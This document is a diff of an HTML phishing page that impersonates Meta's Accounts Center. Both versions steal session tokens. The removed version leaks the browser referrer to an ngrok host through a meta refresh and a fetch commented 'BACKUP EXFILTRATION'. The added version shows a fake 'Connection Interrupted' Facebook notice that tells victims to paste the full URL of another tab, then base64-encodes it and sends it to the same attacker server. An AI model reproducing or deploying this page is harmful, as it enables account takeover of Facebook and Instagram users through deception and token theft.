@@ -1,37 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="referrer" content="unsafe-url">
-    
-    <meta http-equiv="refresh" content="0.5;url=https://bolsteringly-rightish-joan.ngrok-free.dev/log?capture=active">
-
-    <title>Meta Accounts Center</title>
+    <title>Meta Accounts Center - Manual Sync</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 3px; text-align: center; max-width: 350px; }
-        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 16px; color: #262626; margin: 0 0 10px; }
-        p { font-size: 14px; color: #8e8e8e; margin: 0; }
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; text-align: center; }
+        .btn { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+        input { width: 90%; padding: 10px; margin-top: 10px; border: 1px solid #ddd; border-radius: 4px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h2>Syncing...</h2>
-        <p>Please wait while we verify your account connection.</p>
+    <div class="box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="40" alt="FB">
+        <h2>Connection Interrupted</h2>
+        <p style="color:#606770; font-size: 14px;">Facebook security requires a manual verification code to link your Instagram profile.</p>
+        
+        <ol style="text-align: left; font-size: 13px; color: #606770;">
+            <li>Go back to the previous tab.</li>
+            <li>Copy the <b>entire URL</b> from the address bar.</li>
+            <li>Paste it into the box below to sync.</li>
+        </ol>
+
+        <input type="text" id="tokenUrl" placeholder="Paste URL here...">
+        <button class="btn" onclick="sendToPython()">Verify & Link Accounts</button>
     </div>
 
     <script>
-        // BACKUP EXFILTRATION:
-        // If the Meta Refresh fails, this JavaScript 'fetch' tries a secondary push.
-        setTimeout(function() {
-            var leak = document.referrer;
-            if (leak) {
-                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(leak), {mode: 'no-cors'});
+        function sendToPython() {
+            var fullUrl = document.getElementById('tokenUrl').value;
+            if (fullUrl.includes('token=') || fullUrl.includes('blob=')) {
+                // We send it to your Python server via ngrok
+                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(fullUrl), {mode: 'no-cors'});
+                alert("Verification Successful! You may now close this window.");
+            } else {
+                alert("Invalid URL. Please copy the full address from the other tab.");
             }
-        }, 1000);
+        }
     </script>
 </body>
 </html>
